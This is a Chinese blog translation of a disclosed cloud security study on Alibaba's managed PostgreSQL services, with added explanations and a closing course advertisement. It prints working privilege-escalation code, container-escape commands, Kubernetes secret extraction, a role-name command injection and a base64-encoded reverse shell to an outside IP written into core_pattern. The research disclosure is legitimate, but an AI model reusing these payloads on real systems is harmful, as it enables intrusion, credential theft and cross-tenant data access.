#  云渗透案例剖析 ｜ 阿里云PostgreSQL漏洞技术细节

原创 下雨天还在翻译  [ 关注安全技术 ](javascript:void\(0\);)

**关注安全技术** ![]()

微信号 heresecurity

功能介绍 大自然的搬运工；知识库：https://www.heresecurity.wiki

____

___发表于_

收录于合集

‍原文：《#BrokenSesame: Accidental ‘write’ permissions to private registry allowed
potential RCE to Alibaba Cloud Database
Services》https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-
private-registry-allowed-potential-r

拖了很长时间终于有时间阅读文章，这篇文章不只是把原文翻译，还增加了文章中提到的技术进行了内容补充和细化，后续如果遇到这类经典的文章我也会以这种形式翻译。

> 文章中出现这类引用的格式，不属于原文章的内容，而是增加的内容。

在数据库容器中，通过信息收集，发现cronjob任务，每分钟运行一次二进制文件/usr/bin/tsar并具有 root 权限。

  *   * 

    
    
    ls -lah /etc/cron.d/tsar -rw-r--r-- 1 root root 99 Apr 19  2021 /etc/cron.d/tsar

  *   *   *   *   * 

    
    
    cat /etc/cron.d/tsar   
    # cron tsar collect once per minute MAILTO="" * * * * * root /usr/bin/tsar --cron > /dev/null 2>&1

> tsar是一个用于监控系统性能的工具，它可以显示出CPU，内存，网络，磁盘等的使用情况

使用ldd命令查看tsar程序所依赖的共享库

> ldd命令实际上是一个shell脚本，它通过调用动态链接器来实现其功能
>
> https://blog.csdn.net/f_carey/article/details/109686310

![](https://gitee.com/fuli009/images/raw/master/public/20230617194531.png)

> 第一个是虚拟库文件用于和内核交互
>
> 第二个是C标准库
>
> 第三个是动态链接器
>
> 第四个是gcc运行时库
>
> 第五个也是C标准库
>
> 最后一个是动态链接器

查看libgcc_s.so.1库的信息，它归用户所有adbpgadmin，可以被覆盖！

  *   * 

    
    
    $: ls -alh /u01/adbpg/lib/libgcc_s.so.1 -rwxr-xr-x 1 adbpgadmin adbpgadmin 102K Oct 27 12:22 /u01/adbpg/lib/libgcc_s.so.1

可以用我们自己的共享库覆盖这个文件，那么下次 cronjob 任务执行二进制文件时，我们库的代码将以 root 身份执行！

为了利用这种行为，我们遵循了以下步骤：

  1. 编译了一个共享库，将其复制/bin/bash并/bin/dash使其成为 SUID，这样我们就可以以 root 身份执行代码。

  2. 使用PatchELF实用程序向库添加依赖项libgcc_s.so.1。这样当它被加载时，我们自己的库也会被加载。

  3. 覆盖了原来的libgcc_s.so.1库。

  4. 等待/usr/bin/tsar被执行。

我们的策略最终成功了，授予我们 root 访问权限。

>
> 这是一个很常见的提权技巧，它利用了计划任务在执行时会加载一些依赖库的特点，如果这些依赖库可以被普通用户修改或者替换，那么就可以植入恶意代码，从而在计算任务运行时以root权限运行。用ldd命令查看程序所依赖的共享列表

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <stdio.h>#include <stdlib.h>#include <unistd.h>  
    void backup(){  if (setuid(0) == 0) // 设置用户ID为0  {    system("/bin/bash"); // 调用bash命令  }  else  {    perror("setuid failed");  }}

  *   *   *   *   *   * 

    
    
    gcc -fPIC -c rootshell.cgcc -shared -o librootshell.so rootshell.ocp /bin/bash /bin/dashpatchelf --set-interpreter ./librootshell.so dashcp librootshell.so /u01/adbpg/lib/libgcc_s.so.1最后，等待/usr/bin/tsar被执行

![](https://gitee.com/fuli009/images/raw/master/public/20230617194532.png)

这里完成了第一步，通过计划任务提升至root权限

通过调用阿里云门户中的某些操作（例如启用 SSL 加密），我们观察到 SCP 和 SSH 等多个进程的产生。

![](https://gitee.com/fuli009/images/raw/master/public/20230617194533.png)

启用/禁用 SSL 加密的选项

  *   *   *   *   *   * 

    
    
    # Command lines of the spawned processessu - adbpgadmin -c scp /home/adbpgadmin/xxx_ssl_files/* *REDACTED*:/home/adbpgadmin/data/master/seg-1/   
    /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -- *REDACTED* scp -d -t /home/adbpgadmin/data/master/seg-1/

一些被创建的进程在它们的命令行中包含了在我们的容器中不存在的路径。

我们推断这些进程是在另一个与我们的容器共享PID命名空间的容器中被创建的。

为了验证这个理论，我们写了一个Python脚本，等待SCP进程被创建（因为它是用我们的用户运行的），然后通过路径adbpgadmin/proc/{pid}/root/来访问它的文件系统：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    import psutil import os listed = set() while True:     for proc in psutil.process_iter():         try:             processName = proc.name()             processID = proc.pid             cmdLine = proc.cmdline()             if processID not in listed and processName == 'scp':                 os.system('ls -alh /proc/{}/root/'.format(processID))   
                    listed.add(processID)         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):          pass 

> 这段代码的目的是监控系统中是否有scp进程，并且查看它们的根目录下的文件和目录信息。

再次重新启用 SSL 操作后，SCP 进程产生，我们的脚本让我们访问它的文件系统。我们很高兴我们的假设是正确的，并且该进程确实在第二个容器中运行。

使用这种方法，我们对第二个容器进行了更多的信息收集，并得出结论，虽然两个容器不同，但它们的主目录 ( /home/adbpgadmin) 是相同的挂载！

为了在第二个容器中执行代码，我们想到了一个有趣的想法。由于每次我们重新启用 SSL 操作并共享主目录时都会执行 SSH 命令，因此我们可以修改本地 SSH
客户端配置文件/home/adbpgadmin/.ssh/config. 通过这样做，我们可以将LocalCommand字段配置为在下一次 SSH
命令执行期间执行我们自己的任意命令。

![]()

> SSH中的LocalCommand是一个配置选项，它允许你在SSH连接建立后，但在远程shell启动前，在本地机器上执行一个命令
> 注意：要使用LocalCommand，你还需要在系统级别的/etc/ssh/ssh_config文件中设置PermitLocalCommand为yes。默认情况下，它是设置为no的。

覆盖SSH客户端配置后，我们通过阿里云门户再次调用SSL动作。我们观察了SSH进程的spawn，我们的命令是以adbpgadmin第二个容器中的用户身份执行的！

然后我们将 SUID 二进制文件复制到共享主目录，这样我们就可以在第二个容器中以 root 身份执行代码。

![](https://gitee.com/fuli009/images/raw/master/public/20230617194534.png)

成功地从第一个容器横向移动到第二个容器后，我们能从这个新的位置做些什么呢？

在检查了第二个容器的能力后，我们意识到它是一个特权容器。我们发现Docker Unix
socket()可以从容器中访问，这是一个已知的用于容器逃逸技术。/run/docker.sock

> 看我的课程中的Docker安全那一节，有讲。  
> docker -H unix:///run/docker.sock info

考虑到第二个容器只是为了操作（启用SSL加密）而临时创建的，我们利用暴露的Docker Unix socket()来运行一个新的持久的、特权的容器。

这个容器将与主机（K8s节点）共享相同的PID、IPC、UTS、NET、USER和MOUNT命名空间，并将主机根目录挂载在。它将无限期地继续存在，并通过位于的共享管道从我们的非特权容器接收命令。/mnt/home/adbpgadmin

创建新的“超级”容器使我们能够逃逸到主机（K8s节点），并最终访问K8s API，因为我们现在共享相同的网络命名空间。

我们也能够通过调用一个反向shell来避免使用共享的命名管道，因为主机允许向互联网发出出站连接。这是研究中的一个重大成就！

关于如何利用API的更多信息，请参考这个指南。docker.sock

https://docs.docker.com/engine/api/v1.40/

  *   *   * 

    
    
    # Code execution inside the new privileged container $: echo ‘id’ > /home/adbpgadmin/i_pipe; timeout 1 cat /home/adbpgadmin/o_pipe uid=0(root) gid=0(root) groups=10(wheel)

> 1\.
> 使用echo命令，输出’id’这个字符串，并用重定向符号（>）将它写入到/home/adbpgadmin/i_pipe这个文件中。如果这个文件不存在，就创建它；如果存在，就覆盖它的内容。  
> 2\. 使用管道符号（|），将echo命令的输出也传递给后面的命令，即timeout 1 cat /home/adbpgadmin/o_pipe。  
> 3\. 使用timeout命令，限制后面的命令在1秒内执行，否则终止它  
> 4\. 使用cat命令，读取/home/adbpgadmin/o_pipe这个文件的内容，并将它输出到标准输出（屏幕）上。

> 总之，这条命令的目的是在1秒内将’id’写入到i_pipe文件中，并将o_pipe文件中的内容显示出来。如果超过1秒，就停止执行。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # Accessing the host filesystem from the new privileged container$: echo ‘ls -alh /mnt’ > /home/adbpgadmin/i_pipe; timeout 2 cat /home/adbpgadmin/o_pipe total 88 dr-xr-xr-x   23 root     root        4.0K Nov  6 10:07 . drwxr-xr-x    1 root     root        4.0K Nov  7 15:54 .. drwxr-x---    4 root     root        4.0K Nov  6 10:07 .kube lrwxrwxrwx    1 root     root           7 Aug 29  2019 bin -> usr/bin dr-xr-xr-x    5 root     root        4.0K Nov  2 10:21 boot drwxr-xr-x   17 root     root        3.1K Nov  6 10:08 dev drwxr-xr-x   84 root     root        4.0K Nov  6 10:08 etc drwxr-xr-x    3 root     root        4.0K Nov  2 10:24 flash drwxr-xr-x    6 root     root        4.0K Nov  6 10:11 home drwxr-xr-x    2 root     root        4.0K Nov  2 10:24 lafite lrwxrwxrwx    1 root     root           7 Aug 29  2019 lib -> usr/lib lrwxrwxrwx    1 root     root           9 Aug 29  2019 lib64 -> usr/lib64 drwx------    2 root     root       16.0K Aug 29  2019 lost+found drwxr-xr-x    2 root     root        4.0K Dec  7  2018 media drwxr-xr-x    3 root     root        4.0K Nov  6 10:07 mnt drwxr-xr-x   11 root     root        4.0K Nov  6 10:07 opt dr-xr-xr-x  184 root     root           0 Nov  6 10:06 proc dr-xr-x---   10 root     root        4.0K Nov  6 10:07 root 

####

#### 从 K8s 横向移动到供应链攻击

通过访问 K8s API 服务器，我们利用节点的kubelet凭证来检查各种集群资源，包括机密、服务帐户和 pod。

在检查 pod 列表时，我们发现属于同一集群中其他租户的 pod。这表明阿里云为多租户设计了集群，这意味着我们有可能获得对这些 pod 的跨租户访问。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # Listing the pods inside the K8s cluster$: /tmp/kubectl get pods NAME                                                                       READY   STATUS      RESTARTS   AGE gp-4xo3*REDACTED*-master-100333536                                      1/1     Running     0          5d1h gp-4xo3*REDACTED*-master-100333537                                      1/1     Running     0          5d1h gp-4xo3*REDACTED*-segment-100333538                                     1/1     Running     0          5d1h gp-4xo3*REDACTED*-segment-100333539                                     1/1     Running     0          5d1h gp-4xo3*REDACTED*-segment-100333540                                     1/1     Running     0          5d1h gp-4xo3*REDACTED*-segment-100333541                                     1/1     Running     0          5d1h gp-gw87*REDACTED*-master-100292154                                      1/1     Running     0          175d gp-gw87*REDACTED*-master-100292155                                      1/1     Running     0          175d gp-gw87*REDACTED*-segment-100292156                                     1/1     Running     0          175d gp-gw87*REDACTED*-segment-100292157                                     1/1     Running     0          175d gp-gw87*REDACTED*-segment-100292158                                     1/1     Running     0          175d gp-gw87*REDACTED*-segment-100292159                                     1/1     Running     0          175d ...

我们还决定调查容器注册表的秘密，因为阿里云使用他们的私有存储库来托管 K8s 容器镜像。

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # A snippet of the pods configuration, illustrating the use of a private container registry   
    "spec": {     "containers": [         {             "image": "*REDACTED*.eu-central-1.aliyuncs.com/apsaradb_*REDACTED*/*REDACTED*",             "imagePullPolicy": "IfNotPresent", ...                "imagePullSecrets": [         {             "name": "docker-image-secret"         }     ], 

为了在 K8s 中使用私有容器注册表，需要通过配置中的 imagePullSecret字段提供凭证。

提取这个秘密允许我们访问这些凭据并根据容器注册测试它们！

>
> imagePullSecret是一个授权令牌（也称为密钥），用来存储用于访问注册表的Docker凭证。当你需要从私有注册表拉取镜像时，你可以创建一个imagePullSecret，并将其与Pod或服务帐户关联，以便Kubernetes能够验证你的身份并授权你访问注册表。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # Retrieving the container registry secret$: /tmp/kubectl get secret -o json docker-image-secret {     "apiVersion": "v1",     "data": {         ".dockerconfigjson": "eyJhdXRoc*REDACTED*"     },     "kind": "Secret",     "metadata": {         "creationTimestamp": "2020-11-12T14:57:36Z",         "name": "docker-image-secret",         "namespace": "default",         "resourceVersion": "2705",         "selfLink": "/api/v1/namespaces/default/secrets/docker-image-secret",         "uid": "6cb90d8b-1557-467a-b398-ab988db27908"     },     "type": "kubernetes.io/dockerconfigjson" }   
    # Redacted decoded credentials{     "auths": {         "registry-vpc.eu-central-1.aliyuncs.com": {             "auth": "*REDACTED*",             "password": "*REDACTED*",             "username": "apsaradb*REDACTED*"         }     } } 

在针对容器映像注册表测试凭据后，我们发现我们不仅具有读取权限，而且还具有写入权限。这意味着我们有能力覆盖容器镜像，并可能对整个服务和其他服务的镜像进行供应链攻击。

例如我们可以覆盖rds_postgres_*REDACTED*属于另一个服务的图像。

![](https://gitee.com/fuli009/images/raw/master/public/20230617194535.png)

#### 环境变量问题

与我们进行的所有研究一样，我们尝试对文件系统进行秘密扫描，以查看是否可以检索任何访问密钥、私钥等，因为环境卫生不佳可能会引发更具破坏性的攻击。对节点的秘密扫描揭示了各种日志文件（包括该.bash_history文件）中的多个访问密钥。

  *   *   *   *   * 

    
    
    /etc/*REDACTED*/custins/400480085/100333829/custins_job:LTAIALrh*REDACTED*gi /opt/*REDACTED*/golang_extern_backend_sls.conf:LTAI4Fo*REDACTED*5kJ /root/.bash_history:LTAI4FrP*REDACTED*NTqkX /var/lib/*REDACTED*/data/errors-1182678.txt:LTAI4G4*REDACTED*Ujw3y /var/lib/docker/containers/1085d3b04fed29011705ca6d277525bbde342dbc036a605b6ecb74531b708543/config.v2.json:LTAI4Fdepc*REDACTED*v1R

  

以下是第二个案例：  

###

### 云数据库 RDS for PostgreSQL

在对 AnalyticDB 进行研究之后，我们的目标是通过 ApsaraDB RDS 服务复制它的影响。对我们的 ApsaraDB RDS
PostgreSQL 实例容器的侦察揭示了与 AnalyticDB 不同的环境。因此，我们需要寻找新的漏洞来逃脱容器并获得对底层主机的访问权限。

  *   * 

    
    
    $: id uid=1000(alicloud_rds_admin) gid=1000(alicloud_rds_admin) groups=1000(alicloud_rds_admin)

#### 文件泄露原语

在浏览数据库容器中的文件时，我们偶然发现了目录/tmp/tools_log。它包含一个奇怪的文件：

  *   *   *   *   * 

    
    
    $: ls -alh /tmp/tools_log total 2.4M drwxrwxrwx 2 root root 4.0K Nov 10 08:55 . drwxrwxrwx 5 root root 4.0K Nov 16 23:07 .. -rwxrwxrwx 1 root root 2.4M Nov 16 23:07 docker_tools.log

我们意识到这是属于另一个容器的操作日志，负责对我们的数据库容器执行某些操作。这揭示了容器的性质，并提供了有用的信息，例如文件路径。

然后，我们在阿里云门户中搜索有趣的功能以利用 AnalyticDB，并偶然发现了吊销文件配置。在幕后，它触发了这些日志：

![](https://gitee.com/fuli009/images/raw/master/public/20230617194536.png)

红色高亮的部分是显示执行命令的日志。虽然这些命令是在第二个容器中执行的，但它们修改了与我们的数据库容器共享的配置文件。sedsed/data/pg_hba.conf

对于不熟悉sed
-i（就地）命令的人来说，它的工作原理是先将目标文件复制到一个临时位置，使用正则表达式进行所需的修改，然后将编辑过的文件移回原来的位置。我们发现这种行为可以通过符号链接攻击来从第二个容器复制文件。

要进行这种攻击，我们需要使用一个符号链接来替换配置文件，将其引用到第二个容器中的所需文件。在阿里云门户中激活“吊销列表”功能，就会在第二个容器中启动命令，并用第二个容器中的所需文件覆盖。/data/pg_hba.confsed
-i/data/pg_hba.conf

在下面的例子中，我们创建了一个符号链接到（我们从日志中获取了它的路径）。k8s_ctx.py

  * 

    
    
    $: unlink pg_hba.conf; ln -s *REDACTED*/operator/k8s_ctx.py pg_hba.conf 

我们随后更新了阿里云门户中的“吊销列表”，并观察了文件的变化  pg_hba.conf 。当我们读取它时，我们可以看到我们想要的文件的内容！

  *   *   *   *   *   *   *   * 

    
    
    # Reading a file from the second container$: cat pg_hba.conf  import os import pwd from *REDACTED*/operator.utils.envs import ToolImageEnv from *REDACTED*/operator.k8s_ctx import db_ctx_pgsql_config, db_ctx_pgsql_database, db_ctx_pgsql_replica, \     db_ctx_pgsql_system, db_ctx_pgsql_switch … 

对 Python 文件中的任何导入重复此操作使我们能够获得在第二个容器中运行的完整 Python 源代码，从而生成新的攻击面。

源代码表明，几乎所有对我们数据库的管理操作都会创建一个具有相同代码的新容器，其操作由传递给它的环境变量决定。这些信息在我们逃逸到主机时非常有用。

#### 利用RCE并逃逸到主机（K8s节点）

阿里云提供了一项功能，可以在继续进行选定的升级之前验证 PostgreSQL 实例是否可以升级到较新的版本。这是为了避免损坏数据库。

![](https://gitee.com/fuli009/images/raw/master/public/20230617194537.png)

我们在检索到的代码中审核了此功能，发现了一个命令行注入漏洞，该漏洞允许我们在负责此操作的容器中执行代码。

这是易受攻击的功能：

![](https://gitee.com/fuli009/images/raw/master/public/20230617194538.png)该参数未经任何清理就被格式化为命令行；该命令稍后以root权限执行！但我们能控制吗？是的，它是通过以下查询从我们的数据库中选择的：install_user
install_user

    
    
    select rolname from pg_authid where oid=10;

这个查询返回了PostgreSQL超级用户角色名，即数据库的管理员用户名。

由于阿里云使用了这个服务的超级用户的角色名，我们执行了以下操作，以在负责“版本升级检查”的容器中获得代码执行：alicloud_rds_admin

通过阿里云门户启动版本升级检查。

使用ALTER ROLE语句将PostgreSQL用户名更改为命令行注入：alicloud_rds_admin"ALTER ROLE
"alicloud_rds_admin" RENAME TO "`id`";"

等待5秒，等待进程完成。

恢复用户名。

虽然我们一开始对用户名有一些长度限制，但这个流程工作得很完美，我们成功地在“版本升级检查”容器中以root身份执行了代码！

由于这个容器是特权的，我们可以使用容器逃逸技术：core_pattern

如果被挂载为可写（它是），我们可以覆盖，它定义了一个命名核心转储文件的模板。/proc/sys/proc/sys/kernel/core_pattern
的语法允许通过|字符将核心转储传递给一个程序。由于与主机共享，所以在发生崩溃时，程序将在主机上执行。这将允许容器逃逸。/proc/sys/kernel/core_patterncore_pattern

幸运的是，对于我们来说，这种技术的所有条件都满足了。我们用一个bash反向shell（用base64编码）覆盖了：core_pattern

> linux中的/proc目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。
>
>
> /proc/sys/kernel/core_pattern文件是负责进程奔溃时内存数据转储的，当第一个字符是管道符|时，后面的部分会以命令行的方式进行解析并运行。利用这种特性进行逃逸
    
    
    echo '|/bin/bash -c   
    echo${IFS%%??}L2Jpbi9iYXNoIC1pPiYvZGV2L3RjcC8yMC4xMjQuMTk0LjIxMi82MDAwMSAwPiYxCg==|base64${  
    IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern

回到我们的 PostgreSQL 容器，我们所要做的就是让我们的进程崩溃：

> 这条命令的作用是让当前 shell 进程收到一个 SIGSEGV 信号，导致进程异常终止。
    
    
    $: sh -c 'kill -11 "$$"'

我们从主机（K8s 节点）获得了一个反向 shell！

    
    
    [root@i-gw80v6j*REDACTED* /]   
      
    $: id   
    uid=0(root) gid=0(root) groups=0(root)

#### K8s 跨租户访问

与 AnalyticDB 一样，我们利用强大的kubelet凭证来收集集群信息。

我们列出了所有的
pod，并观察到租户的几个数据库位于同一个节点上。就在那时我们意识到我们的节点正在托管多个租户。我们一注意到这一点，就立即停止了研究，并避免访问其他客户的数据。

    
    
    # Other customers’ data mounted on our node  
    $: mount | grep -i /mount | grep -ioE 'pgm-(.*?)/' | sort | uniq   
    pgm-*REDACTED*-data-19d1322c/   
    pgm-*REDACTED*-data-15c361da/   
    pgm-*REDACTED*-data-38f60684/   
    pgm-*REDACTED*-data-61b4d30a/   
    pgm-*REDACTED*-data-0197fb99/   
    pgm-*REDACTED*-data-0fa7676b/   
    pgm-*REDACTED*-data-52250988/   
    pgm-*REDACTED*-data-8d044ffb/   
    pgm-*REDACTED*-data-09290508/   
    pgm-*REDACTED*-data-bc610a92/   
    pgm-*REDACTED*-data-d386ec2d/   
    pgm-*REDACTED*-data-ed5993d7/   
    pgm-*REDACTED*-data-a554506c/   
    pgm-*REDACTED*-data-d99da2be/

我们对 AnalyticDB 和 ApsaraDB RDS 的研究的技术细节到此结束。

  

最后，我打个广告吧：  

云渗透课程618活动，原价2700，打折后2399，最后一天。

![](https://gitee.com/fuli009/images/raw/master/public/20230617194539.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230617194540.png)

Vx:

![](https://gitee.com/fuli009/images/raw/master/public/20230617194541.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

